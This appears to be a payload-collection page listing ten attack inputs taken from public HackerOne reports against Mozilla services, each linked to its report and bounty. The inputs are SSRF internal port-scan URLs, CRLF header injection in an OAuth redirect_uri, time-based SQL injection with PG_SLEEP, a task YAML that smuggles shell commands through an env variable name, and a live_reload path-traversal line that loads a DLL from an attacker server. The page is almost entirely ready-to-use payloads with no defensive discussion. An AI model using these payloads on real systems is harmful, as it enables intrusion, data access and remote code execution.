# Mozilla

10 payloads.

### `f0bfcee6`

```
https://127.0.0.1:86
```

— [Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports](https://hackerone.com/reports/2015554) · Mozilla · [harshdranjan](https://hackerone.com/harshdranjan)

### `36f7937e`

```
https://127.0.0.1:88
```

— [Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports](https://hackerone.com/reports/2015554) · Mozilla · [harshdranjan](https://hackerone.com/harshdranjan)

### `80951689`

```
https://127.0.0.1:87
```

— [Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports](https://hackerone.com/reports/2015554) · Mozilla · [harshdranjan](https://hackerone.com/harshdranjan)

### `4eae413b`

```
https://target.com/oauth/authorize?client_id=&redirect_uri=%0d%0axxx:something&response_type=code
```

**Parameter:** `redirect_uri`
— [Security bug https://target.com/oauth/authorize - CRLF Header injection via "redirect_uri" parameter](https://hackerone.com/reports/2147132) · Mozilla · [oja](https://hackerone.com/oja) · $200.0

### `0d639fc4`

```
https://target.com/oauth/authorize?client_id=&redirect_uri=\\name.tld%0d%0axxx:something&response_type=code
```

**Parameter:** `redirect_uri`
— [Security bug https://target.com/oauth/authorize - CRLF Header injection via "redirect_uri" parameter](https://hackerone.com/reports/2147132) · Mozilla · [oja](https://hackerone.com/oja) · $200.0

### `35abb850`

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

**Parameter:** `invite_code`
— [SQL Injection on target.com via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130) · Mozilla · [supr4s](https://hackerone.com/supr4s)

### `964d7250`

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
```

**Parameter:** `invite_code`
— [SQL Injection on target.com via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130) · Mozilla · [supr4s](https://hackerone.com/supr4s)

### `f5139106`

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
```

**Parameter:** `invite_code`
— [SQL Injection on target.com via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130) · Mozilla · [supr4s](https://hackerone.com/supr4s)

### `4e9a3eeb`

```
retries: 0
created: '2023-10-23T08:10:11.044Z'
deadline: '2023-10-23T11:10:11.044Z'
expires: '2024-10-23T11:10:11.044Z'
taskQueueId: proj-misc/tutorial
projectId: none
tags: {}
scopes: []
payload:
  env:
# Commands to run in here
    test2 --help ; whoami ; ls -lah ;: '--help'
  image: ubuntu:latest
  command:
    - /bin/bash
    - '-c'
    - 'echo hello'
  maxRunTime: 5000
extra: {}
metadata:
  name: example-task
  description: An **example** task
  owner: name@example.com
  source: https://com
```

**Parameter:** `payload.env`
— [RCE on worker host due to unsanitized "env" variable name in task definition on target.com](https://hackerone.com/reports/2221404) · Mozilla · [ebrietas](https://hackerone.com/ebrietas) · $500.0

### `7b91e8c4`

```
live_reload ${attacker_server}/..\\..\\traversal_poc.dll
```

— [Mozilla VPN Clients: RCE via file write and path traversal](https://hackerone.com/reports/2995025) · Mozilla · [trein](https://hackerone.com/trein) · $6,000.0
